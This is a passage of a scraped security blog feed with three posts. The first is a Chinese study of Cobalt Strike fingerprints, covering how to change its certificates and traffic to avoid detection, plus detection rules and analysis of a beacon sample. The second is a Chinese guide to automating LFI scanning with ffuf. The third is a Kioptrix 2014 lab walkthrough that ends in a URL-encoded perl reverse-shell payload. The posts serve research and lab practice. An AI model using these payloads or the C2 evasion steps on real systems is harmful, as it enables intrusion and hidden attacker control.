src="/2023/04/27/file-upload/jpg" alt="image-20220402143933136"></p><p>端口特征已经消失。</p><h2 id="证书特征"><a href="#证书特征" class="headerlink" title="证书特征"></a><strong>证书特征</strong></h2><p>Keytool 是一个Java数据证书的管理工具 ,Keytool 将密钥(key)和证书(certificates)存在一个称为keystore的文件中。在keystore里，包含<br>密钥实体(Key entity)和可信任的证书实体(trusted certificate entries)。</p><p>查看CS目录下的文件，使用keytool查看证书：</p><CS src="CS/dir.jpg" alt="image-20220324140030951" style="zoom:50%;" /><p>命令如下：</p><p><code>keytool -list -v -keystore cobaltstrike.store</code></p><p>密码初始为123456</p><p><img src="/2023/04/27/file-upload/pg" alt="image-20220324134547989"></p><p>可以发现有很明显的证书特征，在另一台kali上查看，发现同样如此：</p><p><img src="/2023/04/27/file-upload/jpg" alt="image-20220324134803598"></p><h3 id="nmap发现"><a href="#nmap发现" class="headerlink" title="nmap发现"></a>nmap发现</h3><p>首先，使用nmap -A 扫描160主机（默认证书），可以从commanName,organizationName等明显看出为CS的服务器，结果如下：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220324135044513"></p><p>扫描时发现，160主机会有如下报错，但是不影响使用：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220324135318187"></p><p>使用keytool命令修改161主机的默认keystore，<code>keytool -keystore cobaltstrike_new.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.com -dname &quot;CN=US, OU=360.com, O=Software, L=Somewhere, ST=Cyberspace, C=CN&quot;</code></p><p>此外还可以通过向[Let’s Encrypt][<a href="https://letsencrypt.org/]%E7%94%B3%E8%AF%B7%E4%B8%80%E4%B8%AA%E5%85%8D%E8%B4%B9%E8%AF%81%E4%B9%A6%E5%B9%B6%E6%89%93%E5%8C%85%E4%B8%BAkeystore%EF%BC%8C%E7%94%A8%E6%9D%A5%E6%9B%BF%E6%8D%A2CS%E8%87%AA%E5%B8%A6%E7%9A%84https%E8%AF%81%E4%B9%A6%E3%80%82">https://letsencrypt.org/]申请一个免费证书并打包为keystore，用来替换CS自带的https证书。</a></p><p>修改之后对161主机进行nmap -A扫描，发现ssl-cert扫描出的commonName等内容已经变成了手动生成的内容，不再有Cobalt Strike特征。</p><p><img src="/2023/04/27/file-upload/" alt="image-20220324141858497"></p><h3 id="测绘引擎发现"><a href="#测绘引擎发现" class="headerlink" title="测绘引擎发现"></a>测绘引擎发现</h3><p>根据上面的信息，通过fofa引擎进行搜索：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">port</span>=<span class="hljs-string">&quot;50050&quot;</span> &amp;&amp; cert=<span class="hljs-string">&quot;cobaltstrike&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/" alt="image-20220402135324371"></p><p>可以发现2000+CS服务器存活。通过censys同样能找到很多CS证书的主机(默认keystore的指纹SHA256)：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">7B49FC589E7E738E3457859D269996ECEF83F693570B0AC482C426B1FA04BD73<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/g" alt="image-20220402140226767"></p><h2 id="伪造上线"><a href="#伪造上线" class="headerlink" title="伪造上线"></a>伪造上线</h2><p>首先简单介绍cobalt strike最常用的两种后门：</p><p>Windows Executable &amp; Windows Executable(S)</p><p><img src="/2023/04/27/file-upload/" alt="image-20220410155803086"></p><p>其中第一种是阶段传输，上线之后从特定url下载得到完整的后门文件，而第二种是不分段传输，直接上传完整payload，两种后门文件的大小如下：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220410160047252"></p><p>CS的上线流程大概如下图所示：</p><p><img src="/2023/04/27/file-upload/" alt="ch"></p><p>其中Stager向Beacon Staging Server请求下载体积较大更复杂的Stage到本地，Beacon Staging Server会校验Url的合法性，Stage解密并解析Beacon配置信息（比如公钥PublicKey、C2 Server信息，接着Stage通过公钥PublicKey加密主机的元数据并发送至C2 Server，C2 Server用私钥解密数据获取主机元数据。</p><h3 id="Checksum8"><a href="#Checksum8" class="headerlink" title="Checksum8"></a>Checksum8</h3><p>360团队先前公布了关于CS中URL校验的算法，也就是checksum8，大概内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_checksum</span>(<span class="hljs-params"><span class="hljs-built_in">input</span></span>):<br>    trial = <span class="hljs-string">&quot;&quot;</span><br>    total = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> total != <span class="hljs-built_in">input</span>:<br>        total = <span class="hljs-number">0</span><br>        trial=<span class="hljs-string">&#x27; &#x27;</span>.join(random.choice(<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyzQWERTYUIOPLKJHGFDSAZXCVBNM1234567890&quot;</span>)  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>))<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>            total = (total + <span class="hljs-built_in">ord</span>(trial[i:i+<span class="hljs-number">1</span>])) % <span class="hljs-number">256</span><br>    <span class="hljs-keyword">return</span> trial<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    uri_x86 = generate_checksum(<span class="hljs-number">92</span>)<br>    uri_x64 = generate_checksum(<span class="hljs-number">93</span>)<br>    <span class="hljs-built_in">print</span> uri_x86<br>    <span class="hljs-built_in">print</span> uri_x64<br></code></pre></td></tr></table></figure><p>运行脚本，并运行Server端，通过请求<code>server_ip/url_x86/x64</code>，可以得到图中所示的文件，也就是完整的payload，具体内容如下：</p><p><img src="/2023/04/27/file-upload/g" alt="image-20220410215346701"></p><p>在报文中体现为：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220410220103034"></p><p><strong>因此，此处可能可以通过对简单的4位url进行处理，进而判断是否是在通过server下载完整后门文件</strong></p><h4 id="隐藏方法"><a href="#隐藏方法" class="headerlink" title="隐藏方法"></a>隐藏方法</h4><p>修改WebServer.class中的此次函数校验的值，修改92，93为其他值，该默认脚本就无法识别。</p><p><strong>检测方法：</strong></p><p>因为只修改校验值，而算法限制校验值有大小限制，因此最多枚举256次就枚举出来。</p><h3 id="解密算法"><a href="#解密算法" class="headerlink" title="解密算法"></a>解密算法</h3><ul><li><p>[cobaltstrikescan][<a href="https://github.com/jpcertcc/aa-tools/blob/master/cobaltstrikescan.py]">https://github.com/jpcertcc/aa-tools/blob/master/cobaltstrikescan.py]</a></p></li><li><p>[CobaltStrikeParser][<a href="https://github.com/Sentinel-One/CobaltStrikeParser]">https://github.com/Sentinel-One/CobaltStrikeParser]</a></p></li></ul><p>结合URL合法性校验的算法和Stage的解密算法，接下来简单介绍如何通过这两者结合来伪造主机上线：</p><ul><li>通过[cobaltspam][<a href="https://github.com/hariomenkel/CobaltSpam]%E7%94%9F%E6%88%90%E4%BC%AA%E9%80%A0%E4%B8%BB%E6%9C%BA,%E4%BD%86CobaltSpam%E4%B8%8A%E7%BA%BF%E7%9A%84%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E9%83%BD%E6%98%AF%E9%9A%8F%E6%9C%BA%E7%94%9F%E6%88%90%EF%BC%8C%E5%BE%88%E5%AE%B9%E6%98%93%E8%A2%AB%E8%AF%86%E5%88%AB%E3%80%82">https://github.com/hariomenkel/CobaltSpam]生成伪造主机,但CobaltSpam上线的主机信息都是随机生成，很容易被识别。</a></li><li>手动生成</li></ul><p>首先，构造Stager Url下载Stage，然后，解析Stager Beacon的配置文件，此处推荐[cobaltstrikescan][<a href="https://github.com/jpcertcc/aa-tools/blob/master/cobaltstrikescan.py]%E5%92%8C[CobaltStrikeParser][https://github.com/Sentinel-One/CobaltStrikeParser]%EF%BC%8C%E5%BE%97%E5%88%B0%E4%BA%86PublicKey%E5%85%AC%E9%92%A5%E4%B8%8EC2">https://github.com/jpcertcc/aa-tools/blob/master/cobaltstrikescan.py]和[CobaltStrikeParser][https://github.com/Sentinel-One/CobaltStrikeParser]，得到了PublicKey公钥与C2</a> Server地址之后，构造虚假主机元数据，加密发送至C2 Server。</p><p><img src="/2023/04/27/file-upload/" alt="spam"></p><h2 id="HTTP流量特征"><a href="#HTTP流量特征" class="headerlink" title="HTTP流量特征"></a>HTTP流量特征</h2><p>对于CS通信过程中的HTTP流量特征，主要有如下两点：</p><ul><li>URL校验的checksum8算法</li></ul><p>URL校验部分可以通过对4位url进行简单处理验证，判断是否在与server进行通信</p><ul><li>submit请求</li></ul><p><img src="/2023/04/27/file-upload/g" alt="submit"></p><p>通过多次报文对比，都会存在&#x2F;submit.php?id&#x3D;xxx的url，且每个主机都对应一个独有的id值。该id值与cookie解密之后的id是一致的。</p><h3 id="隐藏方法-1"><a href="#隐藏方法-1" class="headerlink" title="隐藏方法"></a>隐藏方法</h3><ul><li>修改函数校验值</li><li>通过<a href="https://github.com/rsmudge/Malleable-C2-Profiles">Malleable-C2-Profiles</a>，修改默认请求配置，改成高可信厂商</li></ul><h2 id="HTTPS流量特征"><a href="#HTTPS流量特征" class="headerlink" title="HTTPS流量特征"></a>HTTPS流量特征</h2><p>对于CS的HTTPS流量特征，除了一般特征外，还能从Client Hello报文中获取一些信息：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220410235127740"></p><p>JA3 用于收集Client Hello数据包中以下字段的十进制值：包括版本、可接受的密码、扩展列表、椭圆曲线密码和椭圆曲线密码格式。然后，用<code>,</code>来分隔各个字段、用<code>-</code>来分隔各个字段中的各个值，将这些值串联在一起之后，计算 <code>MD5</code>，就是一个ja3。如果没有某个字段，则这些字段的值为空。</p><p>从报文中可以看出JA3的值，根据这个md5值，可以直接与参考值进行比对，确定是否为某些工具。</p><p>参考链接：<a href="https://github.com/ByteSecLabs/ja3-ja3s-combo/blob/master/master-list.txt">https://github.com/ByteSecLabs/ja3-ja3s-combo/blob/master/master-list.txt</a></p><p>推荐使用[ja3box][<a href="https://github.com/Macr0phag3/ja3box]%E5%B7%A5%E5%85%B7%EF%BC%8C%E8%87%AA%E5%8A%A8%E8%AE%A1%E7%AE%97%E7%9B%B8%E5%BA%94%E5%80%BC%EF%BC%8C%E8%BF%99%E9%87%8C%E9%87%87%E7%94%A8%E8%BE%93%E5%85%A5pcap%E7%9A%84%E6%96%B9%E5%BC%8F%EF%BC%9A">https://github.com/Macr0phag3/ja3box]工具，自动计算相应值，这里采用输入pcap的方式：</a></p><p><img src="/2023/04/27/file-upload/g" alt="image-20220410235952943"></p><p>比对发现为CS工具：</p><p><img src="/2023/04/27/file-upload/pg" alt="image-20220411000145195"></p><h3 id="隐藏方法-2"><a href="#隐藏方法-2" class="headerlink" title="隐藏方法"></a>隐藏方法</h3><ul><li><p>修改HTTPS证书</p></li><li><p>通过<a href="https://github.com/rsmudge/Malleable-C2-Profiles">Malleable-C2-Profiles</a>，修改默认请求配置，改成高可信厂商</p></li></ul><h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><ul><li>端口转发</li><li>域前置</li><li>云函数</li></ul><h2 id="Else"><a href="#Else" class="headerlink" title="Else"></a>Else</h2><p>1、报文中出现大量&#x2F;en_US&#x2F;all.js的请求，但是下载文件后查看文件内容为空，不清楚原理：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220410220940372"></p><p>2、同一台主机中的Cookie，通过脚本解密后能得到</p><p><img src="/2023/04/27/file-upload/g" alt="cookie"></p><p>其中beacon id就是submit.php?id&#x3D;x中的值，但是从cookie中无法提取有效的CS特征。</p><p>3、hs7001规则，无法命中攻击报文，十六进制串不清楚提取原理。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">alert TCP any any -&gt; any any (msg:<span class="hljs-string">&quot;Tool Cobalt Strike Attack - Interactive Vulnerability&quot;</span>; <span class="hljs-attribute">flow</span>:to_server; uricontent:<span class="hljs-string">&quot;/submit.php?id=&quot;</span>; <span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;Content-Type: application/octet-stream&quot;</span>; <span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;Connection: Keep-Alive&quot;</span>; <span class="hljs-attribute">content</span>:<span class="hljs-string">&quot;|00 00 00 40 00 00 00 02 00 00 00 1e 00 00 00 1e|&quot;</span>; distance:<span class="hljs-number">0</span>; sid:hs7001;)<br></code></pre></td></tr></table></figure><p>4、现网CS server扫描方法，通过发送特定字符串，看响应</p><h2 id="Beacon样本分析"><a href="#Beacon样本分析" class="headerlink" title="Beacon样本分析"></a>Beacon样本分析</h2><p>此处以不分段样本举例。</p><p>首先查看导入表：</p><p><img src="/2023/04/27/file-upload/g" alt="image-20220411091723512"></p><p>可以看到几个明显的函数，例如CreateNamedPipeA,CreateThread等等。</p><p>接下来查看main函数，F5：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411092057926"></p><p>有两个函数27B0和1800，接着是死循环，sleep10秒，查看第一个函数：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411092234879"></p><p>该函数没有特别的功能，重点是第二个函数，双击查看：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411092407345"></p><p>该函数中，首先V0为GetTickCount()，返回从操作系统启动所经过的毫秒数，接下来拼接处Buffer的值，将16进制数转换成char，可以看到Buffer为<code>\\.\\pipe\\MSSE-v0-server</code>，也就是管道名称，通过日志查看PipeName：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411093159702"></p><p>结合汇编代码查看：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411093637992"></p><p>1800函数拼接了一个管道名称，然后创建线程执行sub_4016D3函数.。</p><p>接下来查看16D3函数：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411222622839"></p><p>16D3函数中又调用了1608函数，查看内容如下：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411222823870"></p><p>该函数进行了创建管道与链接管道操作，并通过WriteFile将数据写入到管道中。</p><p>结合OD查看：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411223415773"></p><p>此时管道名为<code>\\.\pipe\MSSE-8298-server</code>，接着创建管道，连接，将edi指向的数据写入管道(x86_s.00403010)，查看该地址：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411223609880"></p><p>数据写入后，该线程完成，jmp到sub_4017A2:</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411224228022"></p><p>首先分配一段内存，调用sub_4016F2，查看：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411225448071"></p><p>这里通过ReadFile去读取先前写入管道的数据。读取完之后，跳到sub_401559：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411230004241"></p><p>接着通过VirtualAlloc分配内存，然后通过一个循环异或解密数据放入到这片内存中。</p><p>查看OD：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411231043647"></p><p>前面的分析可知，这里是在循环异或四个字节的数据，四字节位置是[ebp+10]的，也就是x86_s.00403008:</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411231209582"></p><p>大概的外层逻辑就是这样，不断的通过管道读写数据。因此，beacon.exe其实是一个外层的loader，而真正的核心的其中的shellcode。接下来使用海珍的方法直接提取出PE文件。</p><p>直接查看main，跟入sub_401800,由于401800return了sun_4017A2,继续跟踪，到达sub_401559，查看401559，直接在最后一个call下断点，debug：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411232255418"></p><p>运行：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411155147952"></p><p>加载脚本：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> idc import *<br>tmp_list = []<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">byte</span> <span class="hljs-keyword">in</span> idc.GetManyBytes(<span class="hljs-number">0x6c0000</span>, <span class="hljs-number">0x33000</span>):<br>    tmp_list.append(<span class="hljs-keyword">byte</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;dump.bin&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f.<span class="hljs-built_in">write</span>(<span class="hljs-keyword">bytes</span>(tmp_list))<br>print(<span class="hljs-string">&quot;success&quot;</span>)<br></code></pre></td></tr></table></figure><p>通过file–&gt;script file：</p><p><img src="/2023/04/27/file-upload/" alt="file"></p><p>可以提取出dump.bin.</p><p>拖进exe info:</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411232540644"></p><p>可以看出为dll文件。</p><p>对于更深层次的特征分析例如ip，host等，需要对dll文件进行逆向，难度较大，等相关知识完善后进行补充。</p><p>但是通过简单查看导入表，可以猜测出dll的部分功能：</p><p><img src="/2023/04/27/file-upload/" alt="image-20220411234121140"></p><p>可以看到createremotethread（进程注入），createnamedpipe（创建命名管道）等等操作。</p><p>通过上述分析，可以得到当前版本的CS(4.0)，存在的特征如下：</p><ul><li>data段偏移0xC处为连续的4个a</li><li>rdata头部的管道名格式：%c%c%c%c%c%c%c%c%cMSSE-%d-server</li></ul><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><p>对TLS报文作一定处理，通过JA3的原理进行防护？</p><p>WAF对URL进行处理，检验URL合法性的算法？</p><p>是否可以通过nmap的原理，进行扫描？</p><p>引擎判断一定误差内同一个IP相同时间间隔的请求？（可以解决CS的sleep，以及各类爆破，注入工具等等，实现难度可能较大）</p><p>使用yara规则对命名管道进行查询？</p><p>对于data段0xC处的aaaa特征是否有方法检测到？</p>]]></content>
    
    
    <categories>
      
      <category>C2</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C2</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Bugbounty Automation 01——LFI自动化</title>
    <link href="/2024/07/23/Bugbounty%20Automation%2001%E2%80%94%E2%80%94LFI%E8%87%AA%E5%8A%A8%E5%8C%96/"/>
    <url>/2024/07/23/Bugbounty%20Automation%2001%E2%80%94%E2%80%94LFI%E8%87%AA%E5%8A%A8%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>在阅读了各类文章之后发现，其实针对各类漏洞的自动化挖掘都或多或少已经有一些脚本，但是原理和利用的工具都有所差异，因此决定自己动手实现。<br>初步的设想是，依托于 redis 数据库的任务队列特性，自动化进行子域名挖掘，参数挖掘，js 文件泄露，漏洞检测等等功能，并进行消息的即时推送。</p><h2 id="LFI-漏洞"><a href="#LFI-漏洞" class="headerlink" title="LFI 漏洞"></a>LFI 漏洞</h2><p>本地文件包含漏洞(Local File Inclusion)是一种常见的 web 安全漏洞。当应用程序将用户输入的数据作为文件名包含（include）到服务器端的文件中时，由于缺乏对输入数据的适当验证，攻击者可以包含服务器上的其他文件，甚至是敏感文件。<br>一般会造成任意文件读取甚至远程代码执行。</p><h2 id="自动化流程"><a href="#自动化流程" class="headerlink" title="自动化流程"></a>自动化流程</h2><h3 id="子域名挖掘"><a href="#子域名挖掘" class="headerlink" title="子域名挖掘"></a>子域名挖掘</h3><p>子域名挖掘的工具很多，下面列举部分常见的：</p><ul><li><a href="https://github.com/tomnomnom/assetfinder">https://github.com/tomnomnom/assetfinder</a></li><li><a href="https://github.com/YashGoti/crtsh">https://github.com/YashGoti/crtsh</a></li><li><a href="https://github.com/gwen001/github-subdomains">https://github.com/gwen001/github-subdomains</a></li><li><a href="https://github.com/owasp-amass/amass">https://github.com/owasp-amass/amass</a></li><li><a href="https://github.com/tomnomnom/assetfinder">https://github.com/tomnomnom/assetfinder</a></li><li><a href="https://github.com/aboul3la/Sublist3r">https://github.com/aboul3la/Sublist3r</a></li><li>…<br>这部分尽量使用尽可能多的工具，保证收集到的子域名尽量全面。<br>所有工具跑出来的结果放到一个文件里，进行去重处理。<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> domains | assetfinder -subs-<span class="hljs-keyword">only</span><br>subfinder -d vulnweb.<span class="hljs-keyword">com</span> -<span class="hljs-keyword">o</span> results.txt<br>...<br></code></pre></td></tr></table></figure></li></ul><h3 id="参数挖掘"><a href="#参数挖掘" class="headerlink" title="参数挖掘"></a>参数挖掘</h3><p>在获取到子域名之后，对每个域名进行参数的挖掘，这部分为了提高效率，需要先进行判活，再对相似的站点进行过滤等等，后面会单独写一篇文章讨论信息收集（子域名挖掘和参数挖掘）的内容。<br>这里利用 paramspider 工具：<br><a href="https://github.com/devanshbatham/ParamSpider">https://github.com/devanshbatham/ParamSpider</a><br><code>paramspider -d [domain] -o results.txt </code><br><img src="/2023/04/27/file-upload/240412144948960.png"><br>结果如下：<br><img src="/2023/04/27/file-upload/240412145009453.png"></p><h3 id="FFUF"><a href="#FFUF" class="headerlink" title="FFUF"></a>FFUF</h3><p>收集完参数之后，用 FFUF 进行探测。<br><a href="https://github.com/ffuf/ffuf">ffuf&#x2F;ffuf: Fast web fuzzer written in Go (github.com)</a><br><code>for URL in $(&lt;results.txt); do (ffuf -u &quot;$&#123;URL&#125;&quot; -c -w LFI-Jhaddix.txt -mc 200 -ac -sa -t 20 -or -od ffuf_lfi_results); done</code><br>其中- </p><ul><li>-mc 200：只匹配 HTTP 状态码为200的响应。</li><li>-ac：自动调整请求的并发数。</li><li>-sa：禁用自动大小写变异。</li><li>-t 20：设置请求的超时时间为20秒。</li><li>-or：将结果输出到屏幕。</li><li>-od ffuf_lfi_results：将结果输出到指定的目录<code>ffuf_lfi_results</code>。<br>直接用 bash 命令，对 paramspider 的结果进行遍历，用到的字典为 seclist 中的 LFI-Jhaddix.txt:<br><a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt</a></li></ul><h3 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h3><p>在上一步之后，生成的文件内容如下：<br><img src="/2023/04/27/file-upload/240412150801610.png"><br>再通过 grep 命令筛选敏感内容。<br><code>grep -Ril &quot;root:x&quot; ffuf_lfi_results/ | tee VULNERABLE.txt</code></p><ul><li>-R：以递归的方式搜索所有子目录。</li><li>-i：在搜索时忽略大小写</li><li>-l ：只输出包含匹配字符串的文件名，而不输出匹配行的内容。</li></ul>]]></content>
    
    
    <categories>
      
      <category>vulnerability</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnerability</tag>
      
      <tag>SRC</tag>
      
      <tag>automation</tag>
      
      <tag>LFI</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub_kioptrix_2014</title>
    <link href="/2024/07/23/vulnhub_kioptrix_2014/"/>
    <url>/2024/07/23/vulnhub_kioptrix_2014/</url>
    
    <content type="html"><![CDATA[<h1 id="vulnhub-kioptrix-2014"><a href="#vulnhub-kioptrix-2014" class="headerlink" title="vulnhub_kioptrix_2014"></a>vulnhub_kioptrix_2014</h1><p>Finally arrived at the last box of the Kioptrix series!</p><h4 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h4><p>I’ll start by seeking for open ports on the target box.I prefer using masscan and namp for this initial task.</p><p><img src="/2023/04/27/file-upload/image-20231113112052955.png" alt="image-20231113112052955"></p><p>The only service that exposed to us is HTTP on port 80 and port 8080.</p><p>Next step I ultilize dirsearch for directory brute-force, but I could find nothing interesting.</p><p><img src="/2023/04/27/file-upload/image-20231113112109035.png" alt="image-20231113112109035"></p><p>Let’s check them out in firefox:</p><p><img src="/2023/04/27/file-upload/image-20231113112121440.png" alt="image-20231113112121440"></p><p>It reminds me of 403 FORBIDDEN when I access port 8080.Then I shifted my focus to port 80.</p><p><img src="/2023/04/27/file-upload/image-20231113112139060.png" alt="image-20231113112139060"></p><p>It works! However, there is only the phrase “it works,” XD.</p><h4 id="Grabbing-a-shell"><a href="#Grabbing-a-shell" class="headerlink" title="Grabbing a shell"></a>Grabbing a shell</h4><p>Let’s dig deeper — view page source:</p><p><img src="/2023/04/27/file-upload/image-20231113112158809.png" alt="image-20231113112158809"></p><p>Well, now we get something new!</p><p><img src="/2023/04/27/file-upload/image-20231113112209835.png" alt="image-20231113112209835"></p><p>I failed to find file upload or command injection vulnerabilities that could help me access a reverse shell when I explore this new page. However, <code>pChart2.1.3</code> in url seized my attention.</p><p><img src="/2023/04/27/file-upload/image-20231113112221479.png" alt="image-20231113112221479"></p><p>The following steps are quite explicit.</p><p><img src="/2023/04/27/file-upload/image-20231113112232895.png" alt="image-20231113112232895"></p><p>It’s evident that there exists a arbitrary file read vulnerability.</p><p><img src="/2023/04/27/file-upload/image-20231113112247139.png" alt="image-20231113112247139"></p><p>However, we cannot rely on this vulnerability to gain access to the box, we must integrate it with other vulnerabilities. At this point, I recalled the earlier 403 page.</p><p>I googled default path of apache config file:</p><p><img src="/2023/04/27/file-upload/image-20231113112302555.png" alt="image-20231113112302555"></p><p>Let’s go to check its configuration:</p><p><img src="/2023/04/27/file-upload/image-20231113112314281.png" alt="image-20231113112314281"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Allow <span class="hljs-keyword">from</span> <span class="hljs-attribute">env</span>=Mozilla4_browser<br></code></pre></td></tr></table></figure><p>Access port 8080 using burp suite to check User-Agent.</p><p><img src="/2023/04/27/file-upload/image-20231113112332206.png" alt="image-20231113112332206"></p><p>Turn to proxy-settings, Match and replace rules, and then ticket Mozilla&#x2F;4.0:</p><p><img src="/2023/04/27/file-upload/image-20231113112343264.png" alt="image-20231113112343264"></p><p>Let’s try again:</p><p><img src="/2023/04/27/file-upload/image-20231113112433172.png" alt="image-20231113112433172"></p><p>BINGO! Now we can access port 8080.</p><p><img src="/2023/04/27/file-upload/image-20231113112543854.png" alt="image-20231113112543854"></p><p>Nevigate phptax directory and I cound not understand the presented page.</p><p>At this step, I will also suggest searchsploit:</p><p><img src="/2023/04/27/file-upload/image-20231113112556288.png" alt="image-20231113112556288"></p><p><img src="/2023/04/27/file-upload/image-20231113112602381.png" alt="image-20231113112602381"></p><p>So far, I can use the vulnerability mentioned above to grab a reverse shell by accessing the following page:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">192.168.122.17:8080</span>/phptax/drawimage.php?pfilez=xxx;perl+-e+%<span class="hljs-number">27</span>use+Socket%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>i%<span class="hljs-number">3</span>D%<span class="hljs-number">22192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">122</span>.<span class="hljs-number">111</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">24</span>p%<span class="hljs-number">3</span>D4444%<span class="hljs-number">3</span>Bsocket%<span class="hljs-number">28</span>S%<span class="hljs-number">2</span>CPF_INET%<span class="hljs-number">2</span>CSOCK_STREAM%<span class="hljs-number">2</span>Cgetprotobyname%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>tcp%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>Bif%<span class="hljs-number">28</span>connect%<span class="hljs-number">28</span>S%<span class="hljs-number">2</span>Csockaddr_in%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>p%<span class="hljs-number">2</span>Cinet_aton%<span class="hljs-number">28</span>%<span class="hljs-number">24</span>i%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">29</span>%<span class="hljs-number">7</span>Bopen%<span class="hljs-number">28</span>STDIN%<span class="hljs-number">2</span>C%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>S%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>Bopen%<span class="hljs-number">28</span>STDOUT%<span class="hljs-number">2</span>C%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>S%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>Bopen%<span class="hljs-number">28</span>STDERR%<span class="hljs-number">2</span>C%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>E%<span class="hljs-number">26</span>S%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>Bexec%<span class="hljs-number">28</span>%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>Fbin%<span class="hljs-number">2</span>Fsh+-i%<span class="hljs-number">22</span>%<span class="hljs-number">29</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">3</span>B%<span class="hljs-number">27</span>;&amp;pdf=make<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/image-20231113112706972.png" 